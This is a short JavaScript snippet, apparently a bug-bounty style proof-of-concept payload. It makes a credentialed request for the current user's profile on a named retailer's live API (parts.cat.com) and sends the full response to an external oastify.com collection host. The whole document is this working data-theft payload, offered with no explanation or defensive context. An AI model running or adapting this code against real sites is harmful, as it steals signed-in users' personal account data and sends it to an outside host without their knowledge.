fetch('https://parts.cat.com/wcs/resources/store/20203/person/@self?responseFormat=json',{credentials:'include'})
.then(r=>r.text())
.then(t=>fetch('https://cr70ebszwf06lp7i0msf30hmwd24qwlka.oastify.com/?data='+encodeURIComponent(t)))
.catch(e=>console.log('Error:',e.message))
